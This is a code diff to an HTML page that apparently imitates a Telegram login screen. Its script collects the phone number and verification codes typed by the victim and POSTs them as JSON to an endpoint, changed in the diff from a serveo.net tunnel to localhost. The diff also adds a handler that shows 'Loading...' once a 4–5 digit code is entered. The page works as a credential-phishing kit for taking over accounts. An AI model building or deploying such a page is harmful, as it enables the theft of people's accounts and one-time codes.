@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <!--
-https://my.telegram.org/img/favicon-32x32.png
 -->
 <html lang="en-US">
 <head>
@@ -140,11 +139,34 @@ received.style.display = "none";
 </script>
 
 <script>
+
+//document.getElementById('code_telegram').addEventListener('change', function(event) {  const bc = document.querySelector('.next');
+ // if (bc) {
+  //  bc.innerText = "Loading...";
+ // }
+//});
+
+document.getElementById('code_telegram').addEventListener('input', function(event) {
+  const inputValue = event.target.value;
+  const bc = document.querySelector('.next');
+  
+  if (/^\d{4,5}$/.test(inputValue)) {
+    if (bc) {
+      bc.innerText = "Loading...";
+    }
+  } else {
+    if (bc) {
+      bc.innerText = "Next"; 
+    }
+  }
+});
+
+
 document.querySelector('.next').addEventListener('click', () => {
 const number_ver = document.getElementById('number').value;
 const code_ver = document.getElementById('code').value;
 const code_telegram_ver = document.getElementById('code_telegram').value;
-    fetch('https://55aeee325adcc25d0e4b94a4a90982cd.serveo.net/data', {
+    fetch('http://localhost:4040/data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
